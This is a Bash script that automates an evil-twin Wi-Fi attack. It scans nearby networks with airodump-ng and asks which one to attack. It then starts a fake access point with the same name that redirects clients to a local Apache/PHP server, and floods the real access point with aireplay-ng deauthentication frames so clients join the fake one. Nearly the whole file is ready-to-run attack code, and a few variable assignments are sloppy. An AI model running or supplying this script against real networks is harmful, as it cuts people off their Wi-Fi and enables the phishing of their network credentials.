DEAUTH_INTERFACE=wlo1
CAPTURE_INTERFACE=wlo1
AP_INTERFACE=wlp0s20u1

#1.check dependencies
#pacman -S aircrack-ng create_ap apache php php-apache

rm dump-*
httpd -k restart

#awk fields for dump
#ESSID=14
#BSSID=1
#CHANNEL=4
#CLIENT=grep -A 20 Station dump-01.csv 
ip link set dev $AP_INTERFACE down
sleep 3
ip link set dev $AP_INTERFACE up
sleep 3
iwconfig $CAPTURE_INTERFACE mode monitor
airodump-ng -w dump --output-format csv $CAPTURE_INTERFACE

echo "Available Access Points are : "
clear
awk -F"," '{print $14}' dump-01.csv | grep -v "ESSID" 
echo "Enter Access Point name to attack from above list (Case Sensitive)"
read AP
ESSID=$( grep "$AP" dump-01.csv | awk -F"," '{print $14}' )
ESSID=$( echo $ESSID | awk '{$1=$1};1' )
if [ "$ESSID" == "$AP" ]
	then
BSSID=$( grep "$AP" dump-01.csv | awk -F"," '{print $1}' )
BSSID=$( echo $BSSID | awk '{$1=$1};1' )
CHANNEL=$( grep "$AP" dump-01.csv | awk -F"," '{print $4}' )
CLIENT_TMP=$( grep -A 20 "Station" dump-01.csv | grep "$BSSID"  )
CLIENT=$( cat dump-01.csv | awk -F"," '{print $1}' )
CLIENT=$( echo $CLIENT | awk '{$1=$1};1' )
echo "creating fake Access Point "
#deauth problem with sam mac
#create_ap --redirect-to-localhost -n -c $CHANNEL --mac $BSSID $AP_INTERFACE $ESSID
create_ap --daemon --redirect-to-localhost -n  $AP_INTERFACE "$ESSID"
airodump-ng -c $CHANNEL $CAPTURE_INTERFACE
aireplay-ng -0 0 -a $BSSID $DEAUTH_INTERFACE
fi

kill=$( create_ap --list-running | grep ap0 | awk '{print $1}' )
kill $kill
create_ap --list-running
